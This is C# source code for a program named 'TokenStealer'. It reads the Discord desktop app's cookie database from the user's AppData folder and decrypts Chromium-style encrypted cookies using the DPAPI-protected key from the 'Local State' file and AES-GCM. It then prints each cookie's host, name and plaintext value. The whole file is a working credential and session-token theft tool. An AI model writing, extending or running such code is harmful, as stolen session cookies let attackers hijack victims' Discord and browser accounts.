using System;
using System.IO;
using Microsoft.Data.Sqlite;
using System.Linq;
using Newtonsoft.Json.Linq;
using System.Text;

namespace TokenStealer
{
    class Program
    {
        static void Main(string[] args)
        {
            var roamingAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Local Discord App
            Console.WriteLine("===============================================");
            Console.WriteLine("[!] Extracting from local discord appdata\n");
            var discordPath = Path.Combine(roamingAppDataPath, "discord", "Cookies");
            ExtractCookies(discordPath, "SELECT creation_utc, host_key, name, value, path, expires_utc from cookies");
        }

        static void ExtractCookies(string filePath, string query, bool encrypted=false)
        {
            if (File.Exists(filePath))
            {
                using (var connection = new SqliteConnection($"Data Source={filePath}"))
                {
                    connection.Open();

                    var command = connection.CreateCommand();
                    command.CommandText = query;

                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var creationTime = reader.GetString(0);
                            var host = reader.GetString(1);
                            var name = reader.GetString(2);
                            var value = reader.GetString(3);
                            var path = reader.GetString(4);
                            var expiryTime = reader.GetString(5);

                            // decrypt if encrypted
                            if (encrypted)
                            {
                                // get encrypted blob from row
                                byte[] encryptedData = new byte[reader.GetBytes(3, 0, null, 0, int.MaxValue) - 1]; // 3 = val column
                                reader.GetBytes(3, 0, encryptedData, 0, encryptedData.Length);

                                // Get encrypted key from local state file:
                                string encKey = File.ReadAllText(filePath + @"/../../../Local State");
                                encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();

                                // The encrypted key starts with the ASCII encoding of DPAPI (i.e. 0x4450415049) and is Base64 encoded,
                                // i.e. the key must first be Base64 decoded and the first 5 bytes must be removed.
                                // Afterwards a decryption with win32crypt.CryptUnprotectData is possible.
                                var decryptedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);

                                // try decryption
                                try
                                {
                                    // The encrypted data start with the ASCII encoding of v10 (i.e. 0x763130) ...
                                    if (value.StartsWith("v10"))
                                    {
                                        using (var aes = new System.Security.Cryptography.AesGcm(decryptedKey))
                                        {
                                            // ... followed by the 12 bytes nonce,
                                            var nonce = encryptedData[3..15];
                                            // the actual ciphertext 
                                            var encData = encryptedData[15..(encryptedData.Length - 16)];
                                            // and finally the 16 bytes authentication tag.
                                            var auth_tag = encryptedData[(encryptedData.Length - 16)..(encryptedData.Length)];

                                            byte[] plaintextBytes = new byte[encData.Length];

                                            aes.Decrypt(nonce, encData, auth_tag, plaintextBytes);
                                            value = Encoding.UTF8.GetString(plaintextBytes);
                                        }
                                    }
                                    else
                                    {
                                        // TODO
                                        throw new Exception("[!] Cookie encrypted with DPAPI, currently unsupported");
                                    }
                                    
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e);
                                    Console.WriteLine($"[*] Could not decode cookie with encrypted value {value}");
                                }
                            }

                            Console.WriteLine($"[*] Found Cookie:");
                            Console.WriteLine($"    name: {name}");
                            Console.WriteLine($"    creationTime: {creationTime}");
                            Console.WriteLine($"    expiryTime: {expiryTime}");
                            Console.WriteLine($"    host: {host}");
                            Console.WriteLine($"    value: {value}\n");
                        }
                    }
                }
            }
        }
    }
}
